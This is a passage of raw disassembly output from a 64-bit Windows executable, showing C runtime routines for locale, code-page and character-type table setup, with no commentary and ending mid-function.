   140007221:	88 84 0b 18 01 00 00 	mov    %al,0x118(%rbx,%rcx,1)
   140007228:	ff c2                	inc    %edx
   14000722a:	48 ff c1             	inc    %rcx
   14000722d:	3b d6                	cmp    %esi,%edx
   14000722f:	72 c7                	jb     0x1400071f8
   140007231:	48 8b 8d 70 06 00 00 	mov    0x670(%rbp),%rcx
   140007238:	48 33 cc             	xor    %rsp,%rcx
   14000723b:	e8 40 a3 ff ff       	call   0x140001580
   140007240:	4c 8d 9c 24 80 07 00 	lea    0x780(%rsp),%r11
   140007247:	00 
   140007248:	49 8b 5b 18          	mov    0x18(%r11),%rbx
   14000724c:	49 8b 73 20          	mov    0x20(%r11),%rsi
   140007250:	49 8b e3             	mov    %r11,%rsp
   140007253:	5d                   	pop    %rbp
   140007254:	c3                   	ret
   140007255:	cc                   	int3
   140007256:	cc                   	int3
   140007257:	cc                   	int3
   140007258:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000725d:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   140007262:	4c 89 44 24 18       	mov    %r8,0x18(%rsp)
   140007267:	55                   	push   %rbp
   140007268:	56                   	push   %rsi
   140007269:	57                   	push   %rdi
   14000726a:	48 8b ec             	mov    %rsp,%rbp
   14000726d:	48 83 ec 40          	sub    $0x40,%rsp
   140007271:	40 8a f2             	mov    %dl,%sil
   140007274:	8b d9                	mov    %ecx,%ebx
   140007276:	49 8b d1             	mov    %r9,%rdx
   140007279:	49 8b c8             	mov    %r8,%rcx
   14000727c:	e8 97 01 00 00       	call   0x140007418
   140007281:	8b cb                	mov    %ebx,%ecx
   140007283:	e8 dc fc ff ff       	call   0x140006f64
   140007288:	48 8b 4d 30          	mov    0x30(%rbp),%rcx
   14000728c:	8b f8                	mov    %eax,%edi
   14000728e:	4c 8b 81 88 00 00 00 	mov    0x88(%rcx),%r8
   140007295:	41 3b 40 04          	cmp    0x4(%r8),%eax
   140007299:	75 07                	jne    0x1400072a2
   14000729b:	33 c0                	xor    %eax,%eax
   14000729d:	e9 b8 00 00 00       	jmp    0x14000735a
   1400072a2:	b9 28 02 00 00       	mov    $0x228,%ecx
   1400072a7:	e8 ec ed ff ff       	call   0x140006098
   1400072ac:	48 8b d8             	mov    %rax,%rbx
   1400072af:	48 85 c0             	test   %rax,%rax
   1400072b2:	0f 84 95 00 00 00    	je     0x14000734d
   1400072b8:	48 8b 45 30          	mov    0x30(%rbp),%rax
   1400072bc:	ba 04 00 00 00       	mov    $0x4,%edx
   1400072c1:	48 8b cb             	mov    %rbx,%rcx
   1400072c4:	48 8b 80 88 00 00 00 	mov    0x88(%rax),%rax
   1400072cb:	44 8d 42 7c          	lea    0x7c(%rdx),%r8d
   1400072cf:	0f 10 00             	movups (%rax),%xmm0
   1400072d2:	0f 11 01             	movups %xmm0,(%rcx)
   1400072d5:	0f 10 48 10          	movups 0x10(%rax),%xmm1
   1400072d9:	0f 11 49 10          	movups %xmm1,0x10(%rcx)
   1400072dd:	0f 10 40 20          	movups 0x20(%rax),%xmm0
   1400072e1:	0f 11 41 20          	movups %xmm0,0x20(%rcx)
   1400072e5:	0f 10 48 30          	movups 0x30(%rax),%xmm1
   1400072e9:	0f 11 49 30          	movups %xmm1,0x30(%rcx)
   1400072ed:	0f 10 40 40          	movups 0x40(%rax),%xmm0
   1400072f1:	0f 11 41 40          	movups %xmm0,0x40(%rcx)
   1400072f5:	0f 10 48 50          	movups 0x50(%rax),%xmm1
   1400072f9:	0f 11 49 50          	movups %xmm1,0x50(%rcx)
   1400072fd:	0f 10 40 60          	movups 0x60(%rax),%xmm0
   140007301:	0f 11 41 60          	movups %xmm0,0x60(%rcx)
   140007305:	49 03 c8             	add    %r8,%rcx
   140007308:	0f 10 48 70          	movups 0x70(%rax),%xmm1
   14000730c:	49 03 c0             	add    %r8,%rax
   14000730f:	0f 11 49 f0          	movups %xmm1,-0x10(%rcx)
   140007313:	48 83 ea 01          	sub    $0x1,%rdx
   140007317:	75 b6                	jne    0x1400072cf
   140007319:	0f 10 00             	movups (%rax),%xmm0
   14000731c:	0f 11 01             	movups %xmm0,(%rcx)
   14000731f:	0f 10 48 10          	movups 0x10(%rax),%xmm1
   140007323:	0f 11 49 10          	movups %xmm1,0x10(%rcx)
   140007327:	48 8b 40 20          	mov    0x20(%rax),%rax
   14000732b:	48 89 41 20          	mov    %rax,0x20(%rcx)
   14000732f:	8b cf                	mov    %edi,%ecx
   140007331:	21 13                	and    %edx,(%rbx)
   140007333:	48 8b d3             	mov    %rbx,%rdx
   140007336:	e8 11 02 00 00       	call   0x14000754c
   14000733b:	8b f8                	mov    %eax,%edi
   14000733d:	83 f8 ff             	cmp    $0xffffffff,%eax
   140007340:	75 25                	jne    0x140007367
   140007342:	e8 49 e6 ff ff       	call   0x140005990
   140007347:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   14000734d:	83 cf ff             	or     $0xffffffff,%edi
   140007350:	48 8b cb             	mov    %rbx,%rcx
   140007353:	e8 18 ee ff ff       	call   0x140006170
   140007358:	8b c7                	mov    %edi,%eax
   14000735a:	48 8b 5c 24 60       	mov    0x60(%rsp),%rbx
   14000735f:	48 83 c4 40          	add    $0x40,%rsp
   140007363:	5f                   	pop    %rdi
   140007364:	5e                   	pop    %rsi
   140007365:	5d                   	pop    %rbp
   140007366:	c3                   	ret
   140007367:	40 84 f6             	test   %sil,%sil
   14000736a:	75 05                	jne    0x140007371
   14000736c:	e8 c3 d4 ff ff       	call   0x140004834
   140007371:	48 8b 45 30          	mov    0x30(%rbp),%rax
   140007375:	48 8b 88 88 00 00 00 	mov    0x88(%rax),%rcx
   14000737c:	83 c8 ff             	or     $0xffffffff,%eax
   14000737f:	f0 0f c1 01          	lock xadd %eax,(%rcx)
   140007383:	83 f8 01             	cmp    $0x1,%eax
   140007386:	75 1c                	jne    0x1400073a4
   140007388:	48 8b 45 30          	mov    0x30(%rbp),%rax
   14000738c:	48 8b 88 88 00 00 00 	mov    0x88(%rax),%rcx
   140007393:	48 8d 05 36 fe 00 00 	lea    0xfe36(%rip),%rax        # 0x1400171d0
   14000739a:	48 3b c8             	cmp    %rax,%rcx
   14000739d:	74 05                	je     0x1400073a4
   14000739f:	e8 cc ed ff ff       	call   0x140006170
   1400073a4:	c7 03 01 00 00 00    	movl   $0x1,(%rbx)
   1400073aa:	48 8b cb             	mov    %rbx,%rcx
   1400073ad:	48 8b 45 30          	mov    0x30(%rbp),%rax
   1400073b1:	33 db                	xor    %ebx,%ebx
   1400073b3:	48 89 88 88 00 00 00 	mov    %rcx,0x88(%rax)
   1400073ba:	48 8b 45 30          	mov    0x30(%rbp),%rax
   1400073be:	8b 88 a8 03 00 00    	mov    0x3a8(%rax),%ecx
   1400073c4:	85 0d e6 03 01 00    	test   %ecx,0x103e6(%rip)        # 0x1400177b0
   1400073ca:	75 84                	jne    0x140007350
   1400073cc:	48 8d 45 30          	lea    0x30(%rbp),%rax
   1400073d0:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
   1400073d4:	4c 8d 4d e4          	lea    -0x1c(%rbp),%r9
   1400073d8:	48 8d 45 38          	lea    0x38(%rbp),%rax
   1400073dc:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
   1400073e0:	4c 8d 45 f0          	lea    -0x10(%rbp),%r8
   1400073e4:	8d 43 05             	lea    0x5(%rbx),%eax
   1400073e7:	48 8d 55 e8          	lea    -0x18(%rbp),%rdx
   1400073eb:	89 45 e4             	mov    %eax,-0x1c(%rbp)
   1400073ee:	48 8d 4d e0          	lea    -0x20(%rbp),%rcx
   1400073f2:	89 45 e8             	mov    %eax,-0x18(%rbp)
   1400073f5:	e8 ae f9 ff ff       	call   0x140006da8
   1400073fa:	40 84 f6             	test   %sil,%sil
   1400073fd:	0f 84 4d ff ff ff    	je     0x140007350
   140007403:	48 8b 45 38          	mov    0x38(%rbp),%rax
   140007407:	48 8b 08             	mov    (%rax),%rcx
   14000740a:	48 89 0d af fd 00 00 	mov    %rcx,0xfdaf(%rip)        # 0x1400171c0
   140007411:	e9 3a ff ff ff       	jmp    0x140007350
   140007416:	cc                   	int3
   140007417:	cc                   	int3
   140007418:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   14000741d:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140007422:	57                   	push   %rdi
   140007423:	48 83 ec 20          	sub    $0x20,%rsp
   140007427:	48 8b f2             	mov    %rdx,%rsi
   14000742a:	48 8b f9             	mov    %rcx,%rdi
   14000742d:	8b 05 7d 03 01 00    	mov    0x1037d(%rip),%eax        # 0x1400177b0
   140007433:	85 81 a8 03 00 00    	test   %eax,0x3a8(%rcx)
   140007439:	74 13                	je     0x14000744e
   14000743b:	48 83 b9 90 00 00 00 	cmpq   $0x0,0x90(%rcx)
   140007442:	00 
   140007443:	74 09                	je     0x14000744e
   140007445:	48 8b 99 88 00 00 00 	mov    0x88(%rcx),%rbx
   14000744c:	eb 64                	jmp    0x1400074b2
   14000744e:	b9 05 00 00 00       	mov    $0x5,%ecx
   140007453:	e8 d0 eb ff ff       	call   0x140006028
   140007458:	90                   	nop
   140007459:	48 8b 9f 88 00 00 00 	mov    0x88(%rdi),%rbx
   140007460:	48 89 5c 24 30       	mov    %rbx,0x30(%rsp)
   140007465:	48 3b 1e             	cmp    (%rsi),%rbx
   140007468:	74 3e                	je     0x1400074a8
   14000746a:	48 85 db             	test   %rbx,%rbx
   14000746d:	74 22                	je     0x140007491
   14000746f:	83 c8 ff             	or     $0xffffffff,%eax
   140007472:	f0 0f c1 03          	lock xadd %eax,(%rbx)
   140007476:	83 f8 01             	cmp    $0x1,%eax
   140007479:	75 16                	jne    0x140007491
   14000747b:	48 8d 05 4e fd 00 00 	lea    0xfd4e(%rip),%rax        # 0x1400171d0
   140007482:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   140007487:	48 3b c8             	cmp    %rax,%rcx
   14000748a:	74 05                	je     0x140007491
   14000748c:	e8 df ec ff ff       	call   0x140006170
   140007491:	48 8b 06             	mov    (%rsi),%rax
   140007494:	48 89 87 88 00 00 00 	mov    %rax,0x88(%rdi)
   14000749b:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   1400074a0:	f0 ff 00             	lock incl (%rax)
   1400074a3:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400074a8:	b9 05 00 00 00       	mov    $0x5,%ecx
   1400074ad:	e8 ca eb ff ff       	call   0x14000607c
   1400074b2:	48 85 db             	test   %rbx,%rbx
   1400074b5:	74 13                	je     0x1400074ca
   1400074b7:	48 8b c3             	mov    %rbx,%rax
   1400074ba:	48 8b 5c 24 38       	mov    0x38(%rsp),%rbx
   1400074bf:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   1400074c4:	48 83 c4 20          	add    $0x20,%rsp
   1400074c8:	5f                   	pop    %rdi
   1400074c9:	c3                   	ret
   1400074ca:	e8 51 da ff ff       	call   0x140004f20
   1400074cf:	90                   	nop
   1400074d0:	48 83 ec 28          	sub    $0x28,%rsp
   1400074d4:	80 3d b9 12 01 00 00 	cmpb   $0x0,0x112b9(%rip)        # 0x140018794
   1400074db:	75 4c                	jne    0x140007529
   1400074dd:	48 8d 0d 2c 00 01 00 	lea    0x1002c(%rip),%rcx        # 0x140017510
   1400074e4:	48 89 0d 95 12 01 00 	mov    %rcx,0x11295(%rip)        # 0x140018780
   1400074eb:	48 8d 05 de fc 00 00 	lea    0xfcde(%rip),%rax        # 0x1400171d0
   1400074f2:	48 8d 0d 07 ff 00 00 	lea    0xff07(%rip),%rcx        # 0x140017400
   1400074f9:	48 89 05 88 12 01 00 	mov    %rax,0x11288(%rip)        # 0x140018788
   140007500:	48 89 0d 71 12 01 00 	mov    %rcx,0x11271(%rip)        # 0x140018778
   140007507:	e8 7c df ff ff       	call   0x140005488
   14000750c:	4c 8d 0d 75 12 01 00 	lea    0x11275(%rip),%r9        # 0x140018788
   140007513:	4c 8b c0             	mov    %rax,%r8
   140007516:	b2 01                	mov    $0x1,%dl
   140007518:	b9 fd ff ff ff       	mov    $0xfffffffd,%ecx
   14000751d:	e8 36 fd ff ff       	call   0x140007258
   140007522:	c6 05 6b 12 01 00 01 	movb   $0x1,0x1126b(%rip)        # 0x140018794
   140007529:	b0 01                	mov    $0x1,%al
   14000752b:	48 83 c4 28          	add    $0x28,%rsp
   14000752f:	c3                   	ret
   140007530:	48 83 ec 28          	sub    $0x28,%rsp
   140007534:	e8 7b de ff ff       	call   0x1400053b4
   140007539:	48 8b c8             	mov    %rax,%rcx
   14000753c:	48 8d 15 45 12 01 00 	lea    0x11245(%rip),%rdx        # 0x140018788
   140007543:	48 83 c4 28          	add    $0x28,%rsp
   140007547:	e9 cc fe ff ff       	jmp    0x140007418
   14000754c:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   140007551:	55                   	push   %rbp
   140007552:	56                   	push   %rsi
   140007553:	57                   	push   %rdi
   140007554:	41 54                	push   %r12
   140007556:	41 55                	push   %r13
   140007558:	41 56                	push   %r14
   14000755a:	41 57                	push   %r15
   14000755c:	48 83 ec 40          	sub    $0x40,%rsp
   140007560:	48 8b 05 99 fa 00 00 	mov    0xfa99(%rip),%rax        # 0x140017000
   140007567:	48 33 c4             	xor    %rsp,%rax
   14000756a:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   14000756f:	48 8b f2             	mov    %rdx,%rsi
   140007572:	e8 ed f9 ff ff       	call   0x140006f64
   140007577:	33 db                	xor    %ebx,%ebx
   140007579:	8b f8                	mov    %eax,%edi
   14000757b:	85 c0                	test   %eax,%eax
   14000757d:	0f 84 53 02 00 00    	je     0x1400077d6
   140007583:	4c 8d 2d 96 00 01 00 	lea    0x10096(%rip),%r13        # 0x140017620
   14000758a:	44 8b f3             	mov    %ebx,%r14d
   14000758d:	49 8b c5             	mov    %r13,%rax
   140007590:	8d 6b 01             	lea    0x1(%rbx),%ebp
   140007593:	39 38                	cmp    %edi,(%rax)
   140007595:	0f 84 4e 01 00 00    	je     0x1400076e9
   14000759b:	44 03 f5             	add    %ebp,%r14d
   14000759e:	48 83 c0 30          	add    $0x30,%rax
   1400075a2:	41 83 fe 05          	cmp    $0x5,%r14d
   1400075a6:	72 eb                	jb     0x140007593
   1400075a8:	81 ff e8 fd 00 00    	cmp    $0xfde8,%edi
   1400075ae:	0f 84 2d 01 00 00    	je     0x1400076e1
   1400075b4:	0f b7 cf             	movzwl %di,%ecx
   1400075b7:	ff 15 2b 5c 00 00    	call   *0x5c2b(%rip)        # 0x14000d1e8
   1400075bd:	85 c0                	test   %eax,%eax
   1400075bf:	0f 84 1c 01 00 00    	je     0x1400076e1
   1400075c5:	b8 e9 fd 00 00       	mov    $0xfde9,%eax
   1400075ca:	3b f8                	cmp    %eax,%edi
   1400075cc:	75 2e                	jne    0x1400075fc
   1400075ce:	48 89 46 04          	mov    %rax,0x4(%rsi)
   1400075d2:	48 89 9e 20 02 00 00 	mov    %rbx,0x220(%rsi)
   1400075d9:	89 5e 18             	mov    %ebx,0x18(%rsi)
   1400075dc:	66 89 5e 1c          	mov    %bx,0x1c(%rsi)
   1400075e0:	48 8d 7e 0c          	lea    0xc(%rsi),%rdi
   1400075e4:	0f b7 c3             	movzwl %bx,%eax
   1400075e7:	b9 06 00 00 00       	mov    $0x6,%ecx
   1400075ec:	66 f3 ab             	rep stos %ax,(%rdi)
   1400075ef:	48 8b ce             	mov    %rsi,%rcx
   1400075f2:	e8 7d fa ff ff       	call   0x140007074
   1400075f7:	e9 e2 01 00 00       	jmp    0x1400077de
   1400075fc:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   140007601:	8b cf                	mov    %edi,%ecx
   140007603:	ff 15 f7 5b 00 00    	call   *0x5bf7(%rip)        # 0x14000d200
   140007609:	85 c0                	test   %eax,%eax
   14000760b:	0f 84 c4 00 00 00    	je     0x1400076d5
   140007611:	33 d2                	xor    %edx,%edx
   140007613:	48 8d 4e 18          	lea    0x18(%rsi),%rcx
   140007617:	41 b8 01 01 00 00    	mov    $0x101,%r8d
   14000761d:	e8 fe b2 ff ff       	call   0x140002920
   140007622:	83 7c 24 20 02       	cmpl   $0x2,0x20(%rsp)
   140007627:	89 7e 04             	mov    %edi,0x4(%rsi)
   14000762a:	48 89 9e 20 02 00 00 	mov    %rbx,0x220(%rsi)
   140007631:	0f 85 94 00 00 00    	jne    0x1400076cb
   140007637:	48 8d 4c 24 26       	lea    0x26(%rsp),%rcx
   14000763c:	38 5c 24 26          	cmp    %bl,0x26(%rsp)
   140007640:	74 2c                	je     0x14000766e
   140007642:	38 59 01             	cmp    %bl,0x1(%rcx)
   140007645:	74 27                	je     0x14000766e
   140007647:	0f b6 41 01          	movzbl 0x1(%rcx),%eax
   14000764b:	0f b6 11             	movzbl (%rcx),%edx
   14000764e:	3b d0                	cmp    %eax,%edx
   140007650:	77 14                	ja     0x140007666
   140007652:	2b c2                	sub    %edx,%eax
   140007654:	8d 7a 01             	lea    0x1(%rdx),%edi
   140007657:	8d 14 28             	lea    (%rax,%rbp,1),%edx
   14000765a:	80 4c 37 18 04       	orb    $0x4,0x18(%rdi,%rsi,1)
   14000765f:	03 fd                	add    %ebp,%edi
   140007661:	48 2b d5             	sub    %rbp,%rdx
   140007664:	75 f4                	jne    0x14000765a
   140007666:	48 83 c1 02          	add    $0x2,%rcx
   14000766a:	38 19                	cmp    %bl,(%rcx)
   14000766c:	75 d4                	jne    0x140007642
   14000766e:	48 8d 46 1a          	lea    0x1a(%rsi),%rax
   140007672:	b9 fe 00 00 00       	mov    $0xfe,%ecx
   140007677:	80 08 08             	orb    $0x8,(%rax)
   14000767a:	48 03 c5             	add    %rbp,%rax
   14000767d:	48 2b cd             	sub    %rbp,%rcx
   140007680:	75 f5                	jne    0x140007677
   140007682:	8b 4e 04             	mov    0x4(%rsi),%ecx
   140007685:	81 e9 a4 03 00 00    	sub    $0x3a4,%ecx
   14000768b:	74 2e                	je     0x1400076bb
   14000768d:	83 e9 04             	sub    $0x4,%ecx
   140007690:	74 20                	je     0x1400076b2
   140007692:	83 e9 0d             	sub    $0xd,%ecx
   140007695:	74 12                	je     0x1400076a9
   140007697:	3b cd                	cmp    %ebp,%ecx
   140007699:	74 05                	je     0x1400076a0
   14000769b:	48 8b c3             	mov    %rbx,%rax
   14000769e:	eb 22                	jmp    0x1400076c2
   1400076a0:	48 8b 05 51 82 00 00 	mov    0x8251(%rip),%rax        # 0x14000f8f8
   1400076a7:	eb 19                	jmp    0x1400076c2
   1400076a9:	48 8b 05 40 82 00 00 	mov    0x8240(%rip),%rax        # 0x14000f8f0
   1400076b0:	eb 10                	jmp    0x1400076c2
   1400076b2:	48 8b 05 2f 82 00 00 	mov    0x822f(%rip),%rax        # 0x14000f8e8
   1400076b9:	eb 07                	jmp    0x1400076c2
   1400076bb:	48 8b 05 1e 82 00 00 	mov    0x821e(%rip),%rax        # 0x14000f8e0
   1400076c2:	48 89 86 20 02 00 00 	mov    %rax,0x220(%rsi)
   1400076c9:	eb 02                	jmp    0x1400076cd
   1400076cb:	8b eb                	mov    %ebx,%ebp
   1400076cd:	89 6e 08             	mov    %ebp,0x8(%rsi)
   1400076d0:	e9 0b ff ff ff       	jmp    0x1400075e0
   1400076d5:	39 1d b5 10 01 00    	cmp    %ebx,0x110b5(%rip)        # 0x140018790
   1400076db:	0f 85 f5 00 00 00    	jne    0x1400077d6
   1400076e1:	83 c8 ff             	or     $0xffffffff,%eax
   1400076e4:	e9 f7 00 00 00       	jmp    0x1400077e0
   1400076e9:	33 d2                	xor    %edx,%edx
   1400076eb:	48 8d 4e 18          	lea    0x18(%rsi),%rcx
   1400076ef:	41 b8 01 01 00 00    	mov    $0x101,%r8d
   1400076f5:	e8 26 b2 ff ff       	call   0x140002920
   1400076fa:	41 8b c6             	mov    %r14d,%eax
   1400076fd:	4d 8d 4d 10          	lea    0x10(%r13),%r9
   140007701:	4c 8d 3d 08 ff 00 00 	lea    0xff08(%rip),%r15        # 0x140017610
   140007708:	41 be 04 00 00 00    	mov    $0x4,%r14d
   14000770e:	4c 8d 1c 40          	lea    (%rax,%rax,2),%r11
   140007712:	49 c1 e3 04          	shl    $0x4,%r11
   140007716:	4d 03 cb             	add    %r11,%r9
   140007719:	49 8b d1             	mov    %r9,%rdx
   14000771c:	41 38 19             	cmp    %bl,(%r9)
   14000771f:	74 3e                	je     0x14000775f
   140007721:	38 5a 01             	cmp    %bl,0x1(%rdx)
   140007724:	74 39                	je     0x14000775f
   140007726:	44 0f b6 02          	movzbl (%rdx),%r8d
   14000772a:	0f b6 42 01          	movzbl 0x1(%rdx),%eax
   14000772e:	44 3b c0             	cmp    %eax,%r8d
   140007731:	77 24                	ja     0x140007757
   140007733:	45 8d 50 01          	lea    0x1(%r8),%r10d
   140007737:	41 81 fa 01 01 00 00 	cmp    $0x101,%r10d
   14000773e:	73 17                	jae    0x140007757
   140007740:	41 8a 07             	mov    (%r15),%al
   140007743:	44 03 c5             	add    %ebp,%r8d
   140007746:	41 08 44 32 18       	or     %al,0x18(%r10,%rsi,1)
   14000774b:	44 03 d5             	add    %ebp,%r10d
   14000774e:	0f b6 42 01          	movzbl 0x1(%rdx),%eax
   140007752:	44 3b c0             	cmp    %eax,%r8d
   140007755:	76 e0                	jbe    0x140007737
   140007757:	48 83 c2 02          	add    $0x2,%rdx
   14000775b:	38 1a                	cmp    %bl,(%rdx)
   14000775d:	75 c2                	jne    0x140007721
   14000775f:	49 83 c1 08          	add    $0x8,%r9
   140007763:	4c 03 fd             	add    %rbp,%r15
   140007766:	4c 2b f5             	sub    %rbp,%r14
   140007769:	75 ae                	jne    0x140007719
   14000776b:	89 7e 04             	mov    %edi,0x4(%rsi)
   14000776e:	89 6e 08             	mov    %ebp,0x8(%rsi)
   140007771:	81 ef a4 03 00 00    	sub    $0x3a4,%edi
   140007777:	74 29                	je     0x1400077a2
   140007779:	83 ef 04             	sub    $0x4,%edi
   14000777c:	74 1b                	je     0x140007799
   14000777e:	83 ef 0d             	sub    $0xd,%edi
   140007781:	74 0d                	je     0x140007790
   140007783:	3b fd                	cmp    %ebp,%edi
   140007785:	75 22                	jne    0x1400077a9
   140007787:	48 8b 1d 6a 81 00 00 	mov    0x816a(%rip),%rbx        # 0x14000f8f8
   14000778e:	eb 19                	jmp    0x1400077a9
   140007790:	48 8b 1d 59 81 00 00 	mov    0x8159(%rip),%rbx        # 0x14000f8f0
   140007797:	eb 10                	jmp    0x1400077a9
   140007799:	48 8b 1d 48 81 00 00 	mov    0x8148(%rip),%rbx        # 0x14000f8e8
   1400077a0:	eb 07                	jmp    0x1400077a9
   1400077a2:	48 8b 1d 37 81 00 00 	mov    0x8137(%rip),%rbx        # 0x14000f8e0
   1400077a9:	4c 2b de             	sub    %rsi,%r11
   1400077ac:	48 89 9e 20 02 00 00 	mov    %rbx,0x220(%rsi)
   1400077b3:	48 8d 56 0c          	lea    0xc(%rsi),%rdx
   1400077b7:	b9 06 00 00 00       	mov    $0x6,%ecx
   1400077bc:	4b 8d 3c 2b          	lea    (%r11,%r13,1),%rdi
   1400077c0:	0f b7 44 17 f8       	movzwl -0x8(%rdi,%rdx,1),%eax
   1400077c5:	66 89 02             	mov    %ax,(%rdx)
   1400077c8:	48 8d 52 02          	lea    0x2(%rdx),%rdx
   1400077cc:	48 2b cd             	sub    %rbp,%rcx
   1400077cf:	75 ef                	jne    0x1400077c0
   1400077d1:	e9 19 fe ff ff       	jmp    0x1400075ef
   1400077d6:	48 8b ce             	mov    %rsi,%rcx
   1400077d9:	e8 06 f8 ff ff       	call   0x140006fe4
   1400077de:	33 c0                	xor    %eax,%eax
   1400077e0:	48 8b 4c 24 38       	mov    0x38(%rsp),%rcx
   1400077e5:	48 33 cc             	xor    %rsp,%rcx
   1400077e8:	e8 93 9d ff ff       	call   0x140001580
   1400077ed:	48 8b 9c 24 90 00 00 	mov    0x90(%rsp),%rbx
   1400077f4:	00 
   1400077f5:	48 83 c4 40          	add    $0x40,%rsp
   1400077f9:	41 5f                	pop    %r15
   1400077fb:	41 5e                	pop    %r14
   1400077fd:	41 5d                	pop    %r13
   1400077ff:	41 5c                	pop    %r12
   140007801:	5f                   	pop    %rdi
   140007802:	5e                   	pop    %rsi
   140007803:	5d                   	pop    %rbp
   140007804:	c3                   	ret
   140007805:	cc                   	int3
   140007806:	cc                   	int3
   140007807:	cc                   	int3
   140007808:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000780d:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   140007812:	57                   	push   %rdi
   140007813:	48 83 ec 40          	sub    $0x40,%rsp
   140007817:	8b da                	mov    %edx,%ebx
   140007819:	41 8b f9             	mov    %r9d,%edi
   14000781c:	48 8b d1             	mov    %rcx,%rdx
   14000781f:	41 8b f0             	mov    %r8d,%esi
   140007822:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140007827:	e8 14 c2 ff ff       	call   0x140003a40
   14000782c:	48 8b 44 24 30       	mov    0x30(%rsp),%rax
   140007831:	0f b6 d3             	movzbl %bl,%edx
   140007834:	40 84 7c 02 19       	test   %dil,0x19(%rdx,%rax,1)
   140007839:	75 1a                	jne    0x140007855
   14000783b:	85 f6                	test   %esi,%esi
   14000783d:	74 10                	je     0x14000784f
   14000783f:	48 8b 44 24 28       	mov    0x28(%rsp),%rax
   140007844:	48 8b 08             	mov    (%rax),%rcx
   140007847:	0f b7 04 51          	movzwl (%rcx,%rdx,2),%eax
   14000784b:	23 c6                	and    %esi,%eax
   14000784d:	eb 02                	jmp    0x140007851
   14000784f:	33 c0                	xor    %eax,%eax
   140007851:	85 c0                	test   %eax,%eax
   140007853:	74 05                	je     0x14000785a
   140007855:	b8 01 00 00 00       	mov    $0x1,%eax
   14000785a:	80 7c 24 38 00       	cmpb   $0x0,0x38(%rsp)
   14000785f:	74 0c                	je     0x14000786d
   140007861:	48 8b 4c 24 20       	mov    0x20(%rsp),%rcx
   140007866:	83 a1 a8 03 00 00 fd 	andl   $0xfffffffd,0x3a8(%rcx)
   14000786d:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   140007872:	48 8b 74 24 58       	mov    0x58(%rsp),%rsi
   140007877:	48 83 c4 40          	add    $0x40,%rsp
   14000787b:	5f                   	pop    %rdi
   14000787c:	c3                   	ret
   14000787d:	cc                   	int3
   14000787e:	cc                   	int3
   14000787f:	cc                   	int3
   140007880:	8b d1                	mov    %ecx,%edx
   140007882:	41 b9 04 00 00 00    	mov    $0x4,%r9d
   140007888:	33 c9                	xor    %ecx,%ecx
   14000788a:	45 33 c0             	xor    %r8d,%r8d
   14000788d:	e9 76 ff ff ff       	jmp    0x140007808
   140007892:	cc                   	int3
   140007893:	cc                   	int3
   140007894:	48 83 ec 28          	sub    $0x28,%rsp
   140007898:	ff 15 6a 59 00 00    	call   *0x596a(%rip)        # 0x14000d208
   14000789e:	48 89 05 13 0f 01 00 	mov    %rax,0x10f13(%rip)        # 0x1400187b8
   1400078a5:	ff 15 65 59 00 00    	call   *0x5965(%rip)        # 0x14000d210
   1400078ab:	48 89 05 0e 0f 01 00 	mov    %rax,0x10f0e(%rip)        # 0x1400187c0
   1400078b2:	b0 01                	mov    $0x1,%al
   1400078b4:	48 83 c4 28          	add    $0x28,%rsp
   1400078b8:	c3                   	ret
   1400078b9:	cc                   	int3
   1400078ba:	cc                   	int3
   1400078bb:	cc                   	int3
   1400078bc:	81 f9 35 c4 00 00    	cmp    $0xc435,%ecx
   1400078c2:	77 20                	ja     0x1400078e4
   1400078c4:	8d 81 d4 3b ff ff    	lea    -0xc42c(%rcx),%eax
   1400078ca:	83 f8 09             	cmp    $0x9,%eax
   1400078cd:	77 0c                	ja     0x1400078db
   1400078cf:	41 ba a7 02 00 00    	mov    $0x2a7,%r10d
   1400078d5:	41 0f a3 c2          	bt     %eax,%r10d
   1400078d9:	72 05                	jb     0x1400078e0
   1400078db:	83 f9 2a             	cmp    $0x2a,%ecx
   1400078de:	75 2f                	jne    0x14000790f
   1400078e0:	33 d2                	xor    %edx,%edx
   1400078e2:	eb 2b                	jmp    0x14000790f
   1400078e4:	81 f9 98 d6 00 00    	cmp    $0xd698,%ecx
   1400078ea:	74 20                	je     0x14000790c
   1400078ec:	81 f9 a9 de 00 00    	cmp    $0xdea9,%ecx
   1400078f2:	76 1b                	jbe    0x14000790f
   1400078f4:	81 f9 b3 de 00 00    	cmp    $0xdeb3,%ecx
   1400078fa:	76 e4                	jbe    0x1400078e0
   1400078fc:	81 f9 e8 fd 00 00    	cmp    $0xfde8,%ecx
   140007902:	74 dc                	je     0x1400078e0
   140007904:	81 f9 e9 fd 00 00    	cmp    $0xfde9,%ecx
   14000790a:	75 03                	jne    0x14000790f
   14000790c:	83 e2 08             	and    $0x8,%edx
   14000790f:	48 ff 25 02 59 00 00 	rex.W jmp *0x5902(%rip)        # 0x14000d218
   140007916:	cc                   	int3
   140007917:	cc                   	int3
   140007918:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000791d:	57                   	push   %rdi
   14000791e:	8d 81 18 02 ff ff    	lea    -0xfde8(%rcx),%eax
   140007924:	45 8b d9             	mov    %r9d,%r11d
   140007927:	83 f8 01             	cmp    $0x1,%eax
   14000792a:	49 8b d8             	mov    %r8,%rbx
   14000792d:	41 0f 96 c2          	setbe  %r10b
   140007931:	33 ff                	xor    %edi,%edi
   140007933:	81 f9 35 c4 00 00    	cmp    $0xc435,%ecx
   140007939:	77 1c                	ja     0x140007957
   14000793b:	8d 81 d4 3b ff ff    	lea    -0xc42c(%rcx),%eax
   140007941:	83 f8 09             	cmp    $0x9,%eax
   140007944:	77 0c                	ja     0x140007952
